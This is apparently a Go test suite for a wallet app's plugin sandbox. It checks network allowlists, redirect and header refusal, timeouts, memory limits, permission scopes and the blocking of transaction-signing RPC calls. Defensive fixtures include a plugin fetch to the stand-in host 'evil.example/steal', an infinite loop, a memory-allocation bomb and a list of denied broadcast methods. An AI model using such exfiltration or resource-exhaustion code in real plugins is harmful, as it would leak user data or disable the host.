package plugin

import (
	"encoding/json"
	"errors"
	"fmt"
	"net/http"
	"net/http/httptest"
	"strings"
	"testing"
	"time"

	"github.com/MoeForge/moejs"
)

func testManifest(t *testing.T, perms Permissions) Manifest {
	t.Helper()
	m := Manifest{
		ID:          "com.example.test",
		Name:        "Test",
		Version:     "1.0.0",
		Main:        "index.js",
		Permissions: perms,
	}
	if err := m.validate(); err != nil {
		t.Fatalf("test manifest: %v", err)
	}
	return m
}

func testRunner(t *testing.T, m Manifest, source string) *Runner {
	t.Helper()
	host := NewHost(HostDeps{Manifest: m})
	r, err := NewRunner(m, []byte(source), host, "en-US")
	if err != nil {
		t.Fatalf("NewRunner: %v", err)
	}
	t.Cleanup(r.Close)
	return r
}

func TestPageRenders(t *testing.T) {
	m := testManifest(t, Permissions{})
	r := testRunner(t, m, `
export function page({ name }) {
  return {
    title: "Hello " + name,
    sections: [{ stats: [{ label: "Answer", value: "42" }] }],
  };
}
`)
	page, err := r.Page("home")
	if err != nil {
		t.Fatalf("Page: %v", err)
	}
	if page.Title != "Hello home" {
		t.Fatalf("title = %q", page.Title)
	}
	if len(page.Sections) != 1 || page.Sections[0].Stats[0].Value != "42" {
		t.Fatalf("page = %+v", page)
	}
}

func TestPageValidates(t *testing.T) {
	m := testManifest(t, Permissions{})
	r := testRunner(t, m, `
export function page() {
  return { sections: [{ table: { columns: [], rows: [] } }] };
}
`)
	if _, err := r.Page("home"); err == nil || !strings.Contains(err.Error(), "1 to 8 columns") {
		t.Fatalf("err = %v", err)
	}
}

func TestFetchOutsideAllowlistIsRefused(t *testing.T) {
	m := testManifest(t, Permissions{Network: []string{"api.example.com"}})
	r := testRunner(t, m, `
export function page() {
  try {
    host.fetch("https://evil.example/steal");
    return { title: "fetched" };
  } catch (err) {
    return { title: "refused", sections: [{ text: String(err.message) }] };
  }
}
`)
	page, err := r.Page("home")
	if err != nil {
		t.Fatalf("Page: %v", err)
	}
	if page.Title != "refused" {
		t.Fatalf("fetch was not refused: %+v", page)
	}
	text := page.Sections[0].Text
	if !strings.Contains(text, "evil.example") || !strings.Contains(text, "allowlist") {
		t.Fatalf("refusal text = %q", text)
	}
}

// fetchManifest names 127.0.0.1, which a real manifest cannot (its network
// entries must be hostnames), so the tests can serve fetch locally.
func fetchManifest() Manifest {
	return Manifest{
		ID:          "com.example.fetch",
		Name:        "Fetch",
		Version:     "1.0.0",
		Main:        "index.js",
		Permissions: Permissions{Network: []string{"127.0.0.1"}},
	}
}

func TestFetchAllowed(t *testing.T) {
	var gotAuth string
	server := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		gotAuth = r.Header.Get("Authorization")
		fmt.Fprint(w, `{"ok":true}`)
	}))
	defer server.Close()

	m := fetchManifest()
	host := NewHost(HostDeps{Manifest: m})
	r, err := NewRunner(m, []byte(fmt.Sprintf(`
export function page() {
  const res = host.fetch("%s/ok", { headers: { Authorization: "Bearer x" } });
  return { title: res.body, sections: [{ text: String(res.status) }] };
}
`, server.URL)), host, "en-US")
	if err != nil {
		t.Fatalf("NewRunner: %v", err)
	}
	defer r.Close()
	page, err := r.Page("home")
	if err != nil {
		t.Fatalf("Page: %v", err)
	}
	if page.Title != `{"ok":true}` || page.Sections[0].Text != "200" {
		t.Fatalf("page = %+v", page)
	}
	if gotAuth != "Bearer x" {
		t.Fatalf("Authorization = %q", gotAuth)
	}
}

func TestFetchRedirectOutsideAllowlistIsRefused(t *testing.T) {
	target := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		fmt.Fprint(w, "secret")
	}))
	defer target.Close()
	// The redirect points at localhost, which the allowlist does not name.
	location := strings.Replace(target.URL, "127.0.0.1", "localhost", 1)
	redirect := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		http.Redirect(w, r, location, http.StatusFound)
	}))
	defer redirect.Close()

	m := fetchManifest()
	host := NewHost(HostDeps{Manifest: m})
	r, err := NewRunner(m, []byte(fmt.Sprintf(`
export function page() {
  try {
    host.fetch("%s/");
    return { title: "followed" };
  } catch (err) {
    return { title: "refused", sections: [{ text: String(err.message) }] };
  }
}
`, redirect.URL)), host, "en-US")
	if err != nil {
		t.Fatalf("NewRunner: %v", err)
	}
	defer r.Close()
	page, err := r.Page("home")
	if err != nil {
		t.Fatalf("Page: %v", err)
	}
	if page.Title != "refused" {
		t.Fatalf("the redirect was followed: %+v", page)
	}
	text := page.Sections[0].Text
	if !strings.Contains(text, "localhost") || !strings.Contains(text, "allowlist") {
		t.Fatalf("refusal text = %q", text)
	}
}

func TestFetchRefusesHeaders(t *testing.T) {
	m := fetchManifest()
	host := NewHost(HostDeps{Manifest: m})
	r, err := NewRunner(m, []byte(`
export function page() {
  try {
    host.fetch("https://127.0.0.1/", { headers: { Cookie: "a=b" } });
    return { title: "sent" };
  } catch (err) {
    return { title: "refused", sections: [{ text: String(err.message) }] };
  }
}
`), host, "en-US")
	if err != nil {
		t.Fatalf("NewRunner: %v", err)
	}
	defer r.Close()
	page, err := r.Page("home")
	if err != nil {
		t.Fatalf("Page: %v", err)
	}
	if page.Title != "refused" || !strings.Contains(page.Sections[0].Text, "Cookie") {
		t.Fatalf("page = %+v", page)
	}
}

func TestKV(t *testing.T) {
	dir := t.TempDir()
	m := testManifest(t, Permissions{StorageKb: 4})
	kv := &KV{path: dir + "/kv.json", quota: 4 << 10}
	host := NewHost(HostDeps{Manifest: m, KV: kv})
	r, err := NewRunner(m, []byte(`
export function page() {
  const before = host.kv.get("count") || 0;
  host.kv.put("count", before + 1);
  return { title: "count " + host.kv.get("count") };
}
`), host, "en-US")
	if err != nil {
		t.Fatalf("NewRunner: %v", err)
	}
	defer r.Close()
	for want := 1; want <= 2; want++ {
		page, err := r.Page("home")
		if err != nil {
			t.Fatalf("Page: %v", err)
		}
		if page.Title != "count "+string(rune('0'+want)) {
			t.Fatalf("title = %q, want count %d", page.Title, want)
		}
	}
	value, ok := kv.Get("count")
	if !ok || string(value) != "2" {
		t.Fatalf("stored = %s, %v", value, ok)
	}
}

func TestTimeoutRestarts(t *testing.T) {
	m := testManifest(t, Permissions{})
	r := testRunner(t, m, `
export function page() {
  while (true) {}
}
`)
	r.timeout = 100 * time.Millisecond
	start := time.Now()
	_, err := r.Page("home")
	if err == nil || !strings.Contains(err.Error(), "timed out") {
		t.Fatalf("err = %v", err)
	}
	if elapsed := time.Since(start); elapsed > 5*time.Second {
		t.Fatalf("timeout took %s", elapsed)
	}
	if r.Restarts() != 1 {
		t.Fatalf("restarts = %d, want 1", r.Restarts())
	}
}

// TestMemoryBombRestarts is the §13 fixture: a plugin that keeps allocating
// is stopped at the runtime's memory limit, and the next call starts clean.
func TestMemoryBombRestarts(t *testing.T) {
	m := testManifest(t, Permissions{})
	r := testRunner(t, m, `
export function page() {
  const chunks = [];
  for (;;) {
    chunks.push(new Array(1024 * 1024).fill(7));
  }
}
`)
	r.timeout = 15 * time.Second
	start := time.Now()
	_, err := r.Page("home")
	if err == nil || !errors.Is(err, moejs.ErrMemoryLimit) {
		t.Fatalf("err = %v", err)
	}
	if elapsed := time.Since(start); elapsed > 15*time.Second {
		t.Fatalf("the memory limit took %s", elapsed)
	}
	if r.Restarts() != 1 {
		t.Fatalf("restarts = %d, want 1", r.Restarts())
	}
}

func TestSettingAndAccounts(t *testing.T) {
	m := testManifest(t, Permissions{Read: []string{"balances"}})
	m.Settings = []SettingField{{Key: "apiKey", Label: "API key", Secret: true}}
	host := NewHost(HostDeps{
		Manifest: m,
		Settings: func(key string) (string, error) { return "value of " + key, nil },
		Accounts: func() []Account {
			return []Account{{Address: "0xabc", Label: "Main", Family: "evm"}}
		},
	})
	r, err := NewRunner(m, []byte(`
export function page() {
  const accounts = host.accounts();
  return {
    title: host.setting("apiKey"),
    sections: [{ text: accounts[0].address + " " + accounts[0].family + " " + accounts[0].label }],
  };
}
`), host, "en-US")
	if err != nil {
		t.Fatalf("NewRunner: %v", err)
	}
	defer r.Close()
	page, err := r.Page("home")
	if err != nil {
		t.Fatalf("Page: %v", err)
	}
	if page.Title != "value of apiKey" {
		t.Fatalf("title = %q", page.Title)
	}
	if page.Sections[0].Text != "0xabc evm Main" {
		t.Fatalf("text = %q", page.Sections[0].Text)
	}
}

func TestAccountsNeedsReadScope(t *testing.T) {
	m := testManifest(t, Permissions{})
	host := NewHost(HostDeps{
		Manifest: m,
		Accounts: func() []Account {
			t.Fatal("host.accounts returned data without the read scope")
			return nil
		},
	})
	r, err := NewRunner(m, []byte(`
export function page() {
  try {
    host.accounts();
    return { title: "read" };
  } catch (err) {
    return { title: "refused", sections: [{ text: String(err.message) }] };
  }
}
`), host, "en-US")
	if err != nil {
		t.Fatalf("NewRunner: %v", err)
	}
	defer r.Close()
	page, err := r.Page("home")
	if err != nil {
		t.Fatalf("Page: %v", err)
	}
	if page.Title != "refused" || !strings.Contains(page.Sections[0].Text, "balances") {
		t.Fatalf("page = %+v", page)
	}
}

func TestSettingMustBeDeclared(t *testing.T) {
	m := testManifest(t, Permissions{})
	host := NewHost(HostDeps{Manifest: m})
	r, err := NewRunner(m, []byte(`
export function page() {
  try {
    host.setting("other");
    return { title: "read" };
  } catch (err) {
    return { title: "refused", sections: [{ text: String(err.message) }] };
  }
}
`), host, "en-US")
	if err != nil {
		t.Fatalf("NewRunner: %v", err)
	}
	defer r.Close()
	page, err := r.Page("home")
	if err != nil {
		t.Fatalf("Page: %v", err)
	}
	if page.Title != "refused" || !strings.Contains(page.Sections[0].Text, "not declared") {
		t.Fatalf("page = %+v", page)
	}
}

func TestRPCNeedsPermission(t *testing.T) {
	m := testManifest(t, Permissions{})
	var called bool
	host := NewHost(HostDeps{
		Manifest: m,
		RPC: func(chain, method string, params any) (json.RawMessage, error) {
			called = true
			return json.RawMessage(`"0x1"`), nil
		},
	})
	r, err := NewRunner(m, []byte(`
export function page() {
  try {
    host.rpc("eip155:1", "eth_blockNumber");
    return { title: "called" };
  } catch (err) {
    return { title: "refused", sections: [{ text: String(err.message) }] };
  }
}
`), host, "en-US")
	if err != nil {
		t.Fatalf("NewRunner: %v", err)
	}
	defer r.Close()
	page, err := r.Page("home")
	if err != nil {
		t.Fatalf("Page: %v", err)
	}
	if page.Title != "refused" || called {
		t.Fatalf("rpc without permission was not refused: %+v", page)
	}
	if !strings.Contains(page.Sections[0].Text, "not in the plugin's permissions") {
		t.Fatalf("text = %q", page.Sections[0].Text)
	}
}

func TestRPCNearMethodsRespectReadOnlyBoundary(t *testing.T) {
	for _, sign := range []bool{false, true} {
		for _, tt := range []struct {
			method  string
			refused bool
		}{
			{"broadcast_tx_commit", true},
			{"broadcast_tx_async", true},
			{"send_tx", true},
			{"BROADCAST_TX_COMMIT", true},
			{"Broadcast_Tx_Async", true},
			{"SEND_TX", true},
			{"status", false},
			{"query", false},
			{"block", false},
		} {
			t.Run(fmt.Sprintf("%s/sign=%t", tt.method, sign), func(t *testing.T) {
				m := testManifest(t, Permissions{Chains: []string{"near:testnet"}, Sign: sign})
				var called bool
				host := NewHost(HostDeps{
					Manifest: m,
					RPC: func(chain, method string, params any) (json.RawMessage, error) {
						called = true
						return json.RawMessage(`"ok"`), nil
					},
				})
				r, err := NewRunner(m, []byte(fmt.Sprintf(`
export function page() {
  try {
    host.rpc("near:testnet", %q, ["fake signed transaction"]);
    return { title: "called" };
  } catch (err) {
    return { title: "refused", sections: [{ text: String(err.message) }] };
  }
}
`, tt.method)), host, "en-US")
				if err != nil {
					t.Fatalf("NewRunner: %v", err)
				}
				defer r.Close()
				page, err := r.Page("home")
				if err != nil {
					t.Fatalf("Page: %v", err)
				}
				if tt.refused {
					if called || page.Title != "refused" || len(page.Sections) != 1 || !strings.Contains(page.Sections[0].Text, "do not sign or send") {
						t.Fatalf("broadcast was not refused before the broker: called = %t, page = %+v", called, page)
					}
				} else if !called || page.Title != "called" {
					t.Fatalf("read method was refused: called = %t, page = %+v", called, page)
				}
			})
		}
	}
}

func TestRPCDeniesSigning(t *testing.T) {
	m := testManifest(t, Permissions{Chains: []string{"eip155:1"}})
	host := NewHost(HostDeps{
		Manifest: m,
		RPC: func(chain, method string, params any) (json.RawMessage, error) {
			t.Fatalf("host.rpc reached the broker with %q", method)
			return nil, nil
		},
	})
	r, err := NewRunner(m, []byte(`
export function page() {
  try {
    host.rpc("eip155:1", "eth_sendRawTransaction", ["0x00"]);
    return { title: "sent" };
  } catch (err) {
    return { title: "refused", sections: [{ text: String(err.message) }] };
  }
}
`), host, "en-US")
	if err != nil {
		t.Fatalf("NewRunner: %v", err)
	}
	defer r.Close()
	page, err := r.Page("home")
	if err != nil {
		t.Fatalf("Page: %v", err)
	}
	if page.Title != "refused" || !strings.Contains(page.Sections[0].Text, "do not sign or send") {
		t.Fatalf("page = %+v", page)
	}
}
